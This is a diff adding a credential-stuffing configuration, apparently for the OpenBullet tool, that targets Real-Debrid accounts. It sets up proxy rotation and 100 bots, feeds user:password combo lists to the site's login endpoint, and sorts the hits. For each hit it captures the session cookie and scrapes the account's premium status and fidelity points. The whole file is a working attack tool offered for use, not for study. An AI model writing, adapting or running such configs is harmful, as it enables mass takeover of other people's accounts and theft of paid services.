@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Real-Debrid",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-17T13:46:06.1893879+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.3.7 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+var epoch = (new Date).getTime();
+END SCRIPT -> VARS "epoch"
+
+REQUEST GET "https://real-debrid.com/ajax/login.php?user=<USER>&pass=<PASS>&pin_challenge=&pin_answer=PIN%3A+000000&time=<epoch>" ParseQuery=TRUE 
+  
+  HEADER "Host: real-debrid.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://real-debrid.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: https=1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":1,\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"error\":0,\"" 
+
+PARSE "<SOURCE>" LR "auth=" ";" -> VAR "AUTH" 
+
+REQUEST GET "https://real-debrid.com/" ParseQuery=TRUE 
+  
+  HEADER "Host: real-debrid.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://real-debrid.com/" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: https=1; auth=<AUTH>; lang=en" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "<li>Premium :<span class=\"valid\">" "<" -> CAP "Premium" 
+
+PARSE "<SOURCE>" LR "<li>Fidelity Points :<span class=\"fidelity\">" "<" -> CAP "Fidelity Points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Premium :<span class=\"valid\">Expired<" 
+
